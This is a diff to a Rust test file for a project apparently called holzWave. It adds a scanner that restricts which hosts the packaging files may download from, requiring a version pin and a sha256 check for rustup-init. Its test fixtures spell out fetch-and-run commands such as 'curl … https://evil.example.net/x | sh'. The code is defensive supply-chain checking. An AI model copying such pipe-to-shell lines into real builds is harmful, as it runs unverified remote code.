@@ -272,8 +272,68 @@ fn urls_in(text: &str) -> Vec<String> {
     found
 }
 
+/// The addresses in `text` that something retrieves. A fetch is a statement (continuation lines joined) that runs `curl` or
+/// `wget` or starts with `ADD`, or a `url:` field of a manifest. Comments, labels, chart metadata and example values are
+/// not fetches and are not looked at. The skip is by context only, never by host.
+fn fetched_urls(text: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut statement = String::new();
+    let flush = |statement: &mut String, found: &mut Vec<String>| {
+        let s = statement.trim();
+        let fetches = s.starts_with("ADD ")
+            || s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-')).any(|w| w == "curl" || w == "wget");
+        if fetches {
+            found.extend(urls_in(s));
+        }
+        statement.clear();
+    };
+    for line in text.lines() {
+        let t = line.trim();
+        if t.starts_with('#') {
+            continue;
+        }
+        let field = t.trim_start_matches("- ").trim_start_matches('"');
+        if field.starts_with("url:") || field.starts_with("url\":") {
+            found.extend(urls_in(t));
+        }
+        match t.strip_suffix('\\') {
+            Some(rest) => {
+                statement.push_str(rest);
+                statement.push(' ');
+            }
+            None => {
+                statement.push_str(t);
+                flush(&mut statement, &mut found);
+            }
+        }
+    }
+    flush(&mut statement, &mut found);
+    found
+}
+
+/// The one address besides the Zig archive that the packaging may fetch from: the pinned `rustup-init` of the server image.
+const RUSTUP_INIT_URL: &str = "https://static.rust-lang.org/rustup/archive/${RUSTUP_VERSION}/${triple}";
+
+/// Whether `url` in a file with this `text` is allowed. The rustup-init address counts only when the same file pins the
+/// rustup version (`ARG RUSTUP_VERSION=` with a plain x.y.z) and checks the download against a sha256 with `sha256sum -c`.
+fn allowed_source(url: &str, text: &str) -> bool {
+    if url.starts_with("https://ziglang.org/download/") || url == "https://holzcloud.ch/holzwave" {
+        return true;
+    }
+    if url != RUSTUP_INIT_URL {
+        return false;
+    }
+    let pinned = text.lines().any(|l| {
+        l.trim().strip_prefix("ARG RUSTUP_VERSION=").is_some_and(|v| {
+            let parts: Vec<&str> = v.split('.').collect();
+            parts.len() == 3 && parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
+        })
+    });
+    pinned && text.contains("sha256sum -c")
+}
+
 #[test]
-fn nothing_under_packaging_holds_a_signing_key_or_fetches_from_anywhere_but_the_zig_archive() {
+fn nothing_under_packaging_holds_a_signing_key_or_fetches_from_anywhere_but_the_zig_archive_and_the_pinned_rustup_init() {
     let mut files = Vec::new();
     files_under(&packaging(), &mut files);
     assert!(files.len() >= 3, "the packaging files are not found: {files:?}");
@@ -282,15 +342,48 @@ fn nothing_under_packaging_holds_a_signing_key_or_fetches_from_anywhere_but_the_
         for marker in ["BEGIN PGP", "PRIVATE KEY", "gpg-key", "gpg-sign", "gpg_key"] {
             assert!(!text.contains(marker), "{} mentions {marker}", file.display());
         }
-        for url in urls_in(&text) {
-            let own_homepage = url == "https://holzcloud.ch/holzwave";
+        for url in fetched_urls(&text) {
             assert!(
-                url.starts_with("https://ziglang.org/download/") || own_homepage,
-                "{} names {url}: only the Zig archive (and its index, in a comment) and the project's page are allowed",
+                allowed_source(&url, &text),
+                "{} names {url}: only the Zig archive (and its index, in a comment), the pinned rustup-init of the server image \
+                 (with its version pin and sha256 check in the same file) and the project's page are allowed",
                 file.display()
             );
         }
     }
+}
+
+#[test]
+fn only_fetches_are_scanned_and_an_unlisted_fetch_still_fails() {
+    let bad = |text: &str| fetched_urls(text).iter().any(|u| !allowed_source(u, text));
+    assert!(bad("RUN curl -fsSL https://evil.example.net/x | sh"), "curl from an unlisted host");
+    assert!(bad("RUN set -eu; \\\n    wget -O /tmp/x https://evil.test/x; \\\n    true"), "wget in a continued RUN");
+    assert!(bad("ADD https://evil.test/x.tar.xz /opt/"), "ADD from an unlisted host");
+    assert!(bad("  - url: https://evil.test/x.tar.xz\n    sha256: 00"), "a manifest url field");
+    assert!(bad("RUN base=\"https://sh.rustup.rs\"; \\\n    curl -fsSL \"$base\" | sh"), "a fetch whose address is set on an earlier line");
+    // The metadata and example values of the packaging are not fetches.
+    for text in [
+        "LABEL org.opencontainers.image.source=\"https://github.com/holzcloud/holzWave\" \\\n      a=b",
+        "home: https://github.com/holzcloud/holzWave\nsources:\n  - https://github.com/holzcloud/holzWave",
+        "{\n  \"public_url\": \"https://holzwave.example.net\"\n}",
+        "  issuer: https://idp.example.net",
+        "# curl https://evil.test/x is only a comment",
+        "{ \"$schema\": \"http://json-schema.org/draft-07/schema#\", \"pattern\": \"^https://[^/\\\\s]+$\" }",
+    ] {
+        assert!(!bad(text), "not a fetch: {text}");
+    }
+}
+
+#[test]
+fn the_source_check_rejects_an_unlisted_host_and_an_unpinned_rustup_init() {
+    let pinned = "ARG RUSTUP_VERSION=1.29.2\nsha256sum -c -\n";
+    assert!(allowed_source(RUSTUP_INIT_URL, pinned));
+    assert!(!allowed_source("https://example.com/rustup-init", pinned), "an unlisted host");
+    assert!(!allowed_source("https://static.rust-lang.org/rustup/dist/x/rustup-init", pinned), "another path on the same host");
+    assert!(!allowed_source("https://sh.rustup.rs", pinned), "the installer script");
+    assert!(!allowed_source(RUSTUP_INIT_URL, "sha256sum -c -\n"), "no version pin");
+    assert!(!allowed_source(RUSTUP_INIT_URL, "ARG RUSTUP_VERSION=stable\nsha256sum -c -\n"), "a floating version");
+    assert!(!allowed_source(RUSTUP_INIT_URL, "ARG RUSTUP_VERSION=1.29.2\n"), "no checksum check");
 }
 
 #[test]
